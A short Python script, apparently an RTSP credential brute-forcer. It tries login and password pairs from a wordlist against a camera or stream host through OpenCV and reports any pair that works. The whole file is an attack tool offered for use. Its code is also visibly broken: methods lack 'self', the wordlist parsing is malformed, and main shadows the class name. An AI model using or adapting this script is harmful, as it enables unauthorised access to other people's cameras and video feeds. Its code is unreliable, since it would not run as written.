import cv2
import logging


class rtspbf:
    def __init__(self, host, wordlist):
        """
        :param host: ip and port of host, example: 192.168.1.1:554
        :param wordlist: list of tuples with login and password 
        """
        self.host = host
        self.wordlist = wordlist

    def check_auth(login, password):
        """
        check auth pair
        """
        logging.info(f'Checking checking a pair of auth values: {login}:{password}')
        try:
            return cv2.VideoCapture(f'rtsp://{login}:{password}@{self.host}').isOpened()
        except:
            return False

    def run():
        """
        enumerating wordlist values
        """
        for login, password in self.wordlist:
            if self.check_auth(login, password):
                logging.info(f'Authentication pair found: {login}:{password}')
                return (login, password)
        logging.info(f'Authentication pair not found')
        return None, None


def main():
    host = input("ip and port of host, example: 192.168.1.1:554: ")
    filepath = input("path to file(use space as a separator for login and password): ")
    wordlist = list(tuple(login.strip(), password.strip()) for login, password in line.strip('\n').split(' ') for line in open(filepath))
    rtspbf = rtspbf(host, wordlist)
    login, password = rtspbf.run()


if __name__ == '__main__':
    main()

